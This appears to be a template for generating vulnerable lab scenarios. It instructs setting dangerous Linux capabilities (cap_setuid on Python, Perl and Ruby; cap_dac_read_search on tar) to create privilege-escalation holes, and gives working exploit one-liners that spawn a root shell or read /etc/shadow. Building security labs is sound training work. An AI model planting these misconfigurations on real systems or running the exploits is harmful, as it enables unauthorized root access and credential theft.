---
id: set_capability
description: Sets a Linux capability on a binary using setcap, allowing it to perform privileged operations without the SUID bit. A subtler and often-overlooked privilege escalation vector.
required_vars: [binary_path, capability]
---
# Atom: Set Capability
Linux capabilities partition root privileges into discrete units. Assigning dangerous capabilities (e.g. `cap_setuid+ep`) to a binary owned or executable by a low-priv user allows privilege escalation without a visible SUID bit.

### Logic Requirements:
1. `setcap`/`getcap` are provided by the platform base image (the capability tooling is pre-installed). Do NOT install a package-manager package for them.
2. Ensure the target binary (`<binary_path>`) exists. If the scenario's binary is not already present, install the package providing it using the target distro's package manager (see the **Target OS** section) — never hardcode `apt`/`apt-get`.
3. Set the capability on the binary: `setcap <capability> <binary_path>`
4. Optionally make the binary world-executable if it is not already: `chmod a+x <binary_path>`

### Common Patterns:
- **Python with cap_setuid (full UID control):**
  ```bash
  # setcap is already available (base image); install the target binary only if
  # missing, via the target distro's package manager (see Target OS).
  setcap cap_setuid+ep /usr/bin/python3.11
  # Exploit: python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
  ```
- **Perl with cap_setuid:**
  ```bash
  setcap cap_setuid+ep /usr/bin/perl
  # Exploit: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
  ```
- **Ruby with cap_setuid:**
  ```bash
  setcap cap_setuid+ep /usr/bin/ruby
  ```
- **Tar with cap_dac_read_search (read any file):**
  ```bash
  setcap cap_dac_read_search+ep /bin/tar
  # Exploit: tar -xf /etc/shadow
  ```
- **Tcpdump with cap_net_raw (packet capture by non-root):**
  ```bash
  setcap cap_net_raw,cap_net_admin+ep /usr/sbin/tcpdump
  ```

### Testing Guidance:
1. Verify the capability was set: `getcap <binary_path>` — should output `<binary_path> = <capability>`
2. Scan all binaries with capabilities: `getcap -r / 2>/dev/null`
3. If `cap_setuid+ep` was set on Python: `python3 -c "import os; os.setuid(0); os.system('id')"` — output should show `uid=0(root)`.

### Synthesis Guidance:
Choose a `capability` and `binary_path` that fit the scenario narrative. A "monitoring" tool might have `cap_net_raw`. A "debug" build of Python or Ruby left by a developer might have `cap_setuid`. Prefer capabilities from the GTFOBins capabilities list for maximum exploitability in lab scenarios. Always use the exact versioned binary path (e.g. `/usr/bin/python3.11`) rather than a symlink, as `setcap` may not follow symlinks.
